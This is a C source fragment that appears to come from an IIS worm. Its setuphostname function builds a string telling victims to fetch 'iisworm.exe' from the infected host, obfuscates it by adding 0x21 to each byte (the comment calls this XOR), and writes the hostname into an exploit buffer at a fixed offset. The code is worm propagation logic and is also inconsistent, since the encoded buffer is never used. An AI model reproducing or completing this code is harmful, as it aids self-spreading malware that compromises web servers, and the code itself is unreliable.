#pragma optimize("", off)

#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void setuphostname(void) {
    volatile struct _LocalCtx {
        char hostname[1024];
        struct hostent *he;
        char tmp[1024];
        size_t len;
        int i;
    } ctx;

    if (gethostname(ctx.hostname, sizeof(ctx.hostname)) != 0) return;
    ctx.he = gethostbyname(ctx.hostname);
    if (!ctx.he) return;

    strncpy(ctx.tmp, ctx.he->h_name, sizeof(ctx.tmp) - 1);
    ctx.tmp[sizeof(ctx.tmp) - 1] = '\0';
    strncat(ctx.tmp, "!GET /iisworm.exe", sizeof(ctx.tmp) - strlen(ctx.tmp) - 1);

    for (ctx.i = 0; ctx.i < (int)strlen(ctx.tmp); ctx.i++)
        ctx.tmp[ctx.i] += 0x21;   // XOR with 0x21 (add 0x21)

    ctx.len = strlen(ctx.he->h_name);
    if (ctx.len > 100) ctx.len = 100;

    // Copy into the exploit buffer at the correct offset
    memcpy(_sploit + sizeof(_sploit) - 102, ctx.he->h_name, ctx.len);
}

#pragma optimize("", on)
